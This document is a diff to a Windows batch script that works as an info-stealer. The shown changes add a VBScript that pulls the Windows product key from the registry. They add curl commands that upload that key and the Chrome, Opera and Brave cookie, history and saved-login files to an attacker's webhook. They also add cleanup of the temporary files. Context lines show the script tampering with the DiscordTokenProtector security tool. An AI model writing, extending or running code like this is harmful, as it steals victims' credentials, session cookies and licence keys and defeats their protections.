@@ -207,15 +207,76 @@ echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\con
 echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 
+
+
+::get product key
+echo Set WshShell = CreateObject("WScript.Shell") >%userprofile%\AppData\Local\Temp\key.vbs
+echo Set FSO = CreateObject("Scripting.FileSystemObject") >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Set File = FSO.CreateTextFile("%userprofile%\AppData\Local\Temp\Productkey.txt",True) >>%userprofile%\AppData\Local\Temp\key.vbs
+echo File.Write ConvertToKey(WshShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DigitalProductId")) >>%userprofile%\AppData\Local\Temp\key.vbs
+echo File.Close >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Function ConvertToKey(Key) >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Const KeyOffset = 52 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo i = 28 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Chars = "BCDFGHJKMPQRTVWXY2346789" >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Do >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Cur = 0 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo x = 14 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Do >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Cur = Cur * 256 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Cur = Key(x + KeyOffset) + Cur >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Key(x + KeyOffset) = (Cur \ 24) And 255 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Cur = Cur Mod 24 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo x = x -1 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Loop While x ^>= 0 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo i = i -1 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo KeyOutput = Mid(Chars, Cur + 1, 1) ^& KeyOutput >>%userprofile%\AppData\Local\Temp\key.vbs
+echo If (((29 - i) Mod 6) = 0) And (i ^<^> -1) Then >>%userprofile%\AppData\Local\Temp\key.vbs
+echo i = i -1 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo KeyOutput = "-" ^& KeyOutput >>%userprofile%\AppData\Local\Temp\key.vbs
+echo End If >>%userprofile%\AppData\Local\Temp\key.vbs
+echo Loop While i ^>= 0 >>%userprofile%\AppData\Local\Temp\key.vbs
+echo ConvertToKey = KeyOutput >>%userprofile%\AppData\Local\Temp\key.vbs
+echo End Function >>%userprofile%\AppData\Local\Temp\key.vbs
+start %userprofile%\AppData\Local\Temp\key.vbs
+timeout 1 >NUL
+
+set /p keya=<%localappdata%\Temp\Productkey.txt
+
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Productkey: %keya%\"}" %webhook%
+
+
+::not decrypted passwords
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Chrome data \"}" %webhook%
+curl -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
+curl -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
+curl -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
+curl -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
+curl -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
+curl -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Opera data: \"}" %webhook%
+curl -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhook%
+curl -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhook%
+curl -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %webhook%
+curl -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
+curl -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhook%
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Brave data: \"}" %webhook%
+curl -F ff=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks" %webhook%
+curl -F hf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History" %webhook%
+curl -F df=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Login Data" %webhook%
+
+
 ::deletes all temp files
-del %userprofile%\AppData\Local\Temp\ip.txt 
-del %userprofile%\AppData\Local\Temp\ipp.txt 
-del %userprofile%\AppData\Local\Temp\sysi.txt 
-del %userprofile%\AppData\Local\Temp\System_INFO.txt 
-del %userprofile%\AppData\Local\Temp\netstat.txt 
-del %userprofile%\AppData\Local\Temp\test.ps1 
-del %userprofile%\AppData\Local\Temp\programms.txt 
-del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg
-del %userprofile%\AppData\Local\Temp\uuid.txt
-del %userprofile%\AppData\Local\Temp\testtttt.ps1 
-del %userprofile%\AppData\Local\Temp\wlan.txt
+del %localappdata%\Temp\ip.txt 
+del %localappdata%\Temp\ipp.txt 
+del %localappdata%\Temp\sysi.txt 
+del %localappdata%\Temp\System_INFO.txt 
+del %localappdata%\Temp\netstat.txt 
+del %localappdata%\Temp\test.ps1 
+del %localappdata%\Temp\programms.txt 
+del %localappdata%\Temp\%username%_Capture.jpg
+del %localappdata%\Temp\uuid.txt
+del %localappdata%\Temp\testtttt.ps1 
+del %localappdata%\Temp\wlan.txt
+del %localappdata%\Temp\key.vbs
+del %localappdata%\Temp\Productkey.txt
